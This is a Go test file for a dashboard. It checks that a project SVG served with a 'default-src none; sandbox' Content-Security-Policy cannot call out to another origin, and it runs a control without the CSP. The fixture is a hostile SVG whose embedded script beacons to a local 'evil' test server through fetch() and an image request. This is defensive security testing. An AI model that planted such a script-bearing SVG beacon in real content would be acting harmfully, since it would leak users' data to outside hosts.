//go:build !windows

package dashboard

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"
)

// .
// .
// .
// .
// .
// .
// .
// .
// .
// .
// .
// .
// .
// .
// .
// .
// .
func TestANavigatedProjectSVGCannotPhoneHome(t *testing.T) {
	if testing.Short() {
		t.Skip("browser engines are not run in -short")
	}

	hits := make(chan string, 8)
	evil := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		select {
		case hits <- r.URL.Path:
		default:
		}
		w.WriteHeader(200)
	}))
	defer evil.Close()

	// .
	// .
	hostile := fmt.Sprintf(`<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">
  <script type="application/ecmascript"><![CDATA[
    try { fetch(%q, { mode: 'no-cors' }); } catch (e) {}
    try { new Image().src = %q; } catch (e) {}
  ]]></script>
  <rect width="10" height="10"/>
</svg>`, evil.URL+"/leak-fetch", evil.URL+"/leak-img")

	drain := func() {
		for {
			select {
			case <-hits:
			default:
				return
			}
		}
	}

	// .
	// .
	t.Run("under-the-project-file-CSP", func(t *testing.T) {
		drain()
		navigateInEnginesExpectingInertness(t, hostile, nil, map[string]string{
			"Content-Type":            "image/svg+xml",
			"Content-Security-Policy": "default-src 'none'; sandbox",
			"X-Content-Type-Options":  "nosniff",
			"Content-Disposition":     "inline",
		}, 3*time.Second)
		select {
		case p := <-hits:
			t.Fatalf("a navigated project SVG reached another origin at %s — the CSP did not hold", p)
		default:
		}
	})

	// .
	// .
	// .
	// .
	t.Run("control-without-CSP-the-beacon-arrives", func(t *testing.T) {
		drain()
		navigateInEnginesExpectingInertness(t, hostile, nil, map[string]string{
			"Content-Type": "image/svg+xml",
		}, 3*time.Second)
		select {
		case <-hits:
		case <-time.After(2 * time.Second):
			t.Fatal("the control never reached the evil origin — this test cannot detect a beacon, so the CSP half proves nothing")
		}
	})
}
